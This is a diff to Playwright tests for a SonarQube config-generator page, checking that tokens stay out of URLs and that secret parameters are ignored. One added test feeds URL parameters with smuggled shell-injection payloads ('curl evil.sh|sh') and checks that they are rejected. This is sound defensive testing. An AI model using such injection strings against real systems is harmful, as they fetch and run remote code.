@@ -433,17 +433,13 @@ test.describe('config-generator.html', () => {
     await page.locator('#pf-org').fill('my-org');
     await page.locator('#token').fill('sqp_super_secret_token');
     await page.locator('#card-sqc').click();
-    await page.waitForFunction(() => {
-      const search = window.location.search;
-      return search.includes('agent=cursor') && !search.includes('token');
-    });
+    await expect(page).toHaveURL(/agent=cursor/);
+    await expect(page).toHaveURL(/transport=sqc/);
+    await expect(page).toHaveURL(/org=my-org/);
     const search = new URL(page.url()).searchParams;
     expect(search.has('token')).toBe(false);
     expect(search.has('SONARQUBE_TOKEN')).toBe(false);
     expect(page.url()).not.toContain('sqp_super_secret_token');
-    expect(page.url()).toContain('agent=cursor');
-    expect(page.url()).toContain('org=my-org');
-    expect(page.url()).toContain('transport=sqc');
   });
 
   test('URL params: ignores invalid values safely', async ({ page }) => {
@@ -465,10 +461,19 @@ test.describe('config-generator.html', () => {
   });
 
   test('URL params: secret query params are ignored on load', async ({ page }) => {
-    await page.goto('/config-generator.html?agent=cursor&token=leaked-token&keystorePassword=leaked-password');
+    await page.goto('/config-generator.html?agent=cursor&transport=https&httpMode=launch&token=leaked-token&keystorePassword=leaked-password');
     await expect(page.locator('#tool-projects')).toBeAttached();
     await expect(page.locator('#agent')).toHaveValue('cursor');
+    await expect(page.locator('#card-https')).toHaveClass(/active/);
     await expect(page.locator('#token')).toHaveValue('');
     await expect(page.locator('#keystorePassword')).toHaveValue('');
+  });
+
+  test('URL params: rejects shell-injection payloads on load', async ({ page }) => {
+    await page.goto('/config-generator.html?agent=cursor&org=x%22;curl%20evil.sh|sh;echo%20%22&httpPort=8080;curl%20evil|sh%23');
+    await expect(page.locator('#tool-projects')).toBeAttached();
+    await expect(page.locator('#agent')).toHaveValue('cursor');
+    await expect(page.locator('#pf-org')).toHaveValue('');
+    await expect(page.locator('#httpPort')).toHaveValue('8080');
   });
 });
